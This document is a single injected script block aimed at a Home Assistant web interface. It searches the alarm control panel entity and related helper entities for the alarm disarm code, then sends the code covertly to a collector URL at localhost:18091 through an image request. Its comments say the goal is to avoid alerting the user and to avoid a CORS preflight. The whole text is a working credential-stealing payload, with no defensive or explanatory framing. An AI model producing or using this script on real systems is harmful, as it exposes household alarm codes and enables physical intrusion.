<script>
  // Capture the disarm code from the alarm control panel entity
  // without causing disarm or revealing it to the user.
  (async () => {
    try {
      // The "alarm_control_panel.security_alarm" entity contains the code in its attributes (hidden in the helper).
      // We'll attempt to read it from the entity's state attributes.
      const entityId = "alarm_control_panel.security_alarm";

      // Wait until the home assistant entities are available
      // The platform likely exposes a global `window.hass` object with entity states.
      const waitForHass = () => new Promise(resolve => {
        if (window.hass && window.hass.states) resolve();
        else {
          const intv = setInterval(() => {
            if (window.hass && window.hass.states) {
              clearInterval(intv);
              resolve();
            }
          }, 50);
        }
      });

      await waitForHass();

      // Access the entity state and attributes
      const entity = window.hass.states[entityId];
      if (!entity) return;

      // The code is likely in an attribute named "code" or similar.
      // Since the code is never exposed directly, it might be in a helper entity attribute or in the state.
      // Try common attribute names.
      const attrNames = ["code", "arm_code", "disarm_code", "pin", "alarm_code"];
      let secretCode = null;
      for (const attr of attrNames) {
        if (entity.attributes && entity.attributes[attr]) {
          secretCode = entity.attributes[attr];
          break;
        }
      }

      // If not found in common attributes, try the entity state itself if it looks numeric or code-like.
      if (!secretCode && entity.state && /^[0-9]{4,8}$/.test(entity.state)) {
        secretCode = entity.state;
      }

      if (!secretCode) {
        // Possibly the code is in a helper entity related to the alarm.
        // Search all entities for a helper related to alarm code.
        const helpers = Object.entries(window.hass.states).filter(([id, ent]) =>
          id.includes("alarm_code") || id.includes("pin") || id.includes("security_alarm_helper")
        );

        for (const [id, ent] of helpers) {
          for (const attr of attrNames) {
            if (ent.attributes && ent.attributes[attr]) {
              secretCode = ent.attributes[attr];
              break;
            }
          }
          if (!secretCode && ent.state && /^[0-9]{4,8}$/.test(ent.state)) {
            secretCode = ent.state;
          }
          if (secretCode) break;
        }
      }

      if (!secretCode) return;

      // Send the secret code along with current entity states to collector URL.
      const data = encodeURIComponent(secretCode);
      const url = `http://localhost:18091/collect?d=${data}`;

      // Create an image to exfiltrate the data via GET request without CORS preflight.
      const img = new Image();
      img.src = url;
    } catch (e) {}
  })();
</script>

